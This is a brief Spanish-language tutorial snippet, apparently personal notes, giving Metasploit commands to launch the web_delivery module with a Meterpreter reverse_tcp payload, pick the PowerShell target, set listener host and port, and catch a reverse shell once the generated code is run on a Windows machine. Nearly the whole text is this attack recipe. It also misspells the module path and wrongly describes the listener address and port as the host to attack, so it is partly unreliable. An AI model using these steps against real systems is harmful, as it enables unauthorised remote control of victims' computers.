## En metasploit 
```bash
use exploit/multi/sccript/web_delivery
```
Configuramos el payload con: 

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

Luego con 

```bash
show targets 
```

elegimos PSH y elegimos con set target 2

Después configuramos el host y puerto a atacar con 

```bash
set lhost IP y set lport PORT 
```

Ya estaría listo, solo falta ingresar en la terminal “exploit”  y espera a una conexión reversa en la terminal después de ejecutar el código que generó con metasploit, en la terminal de la maquina windows.
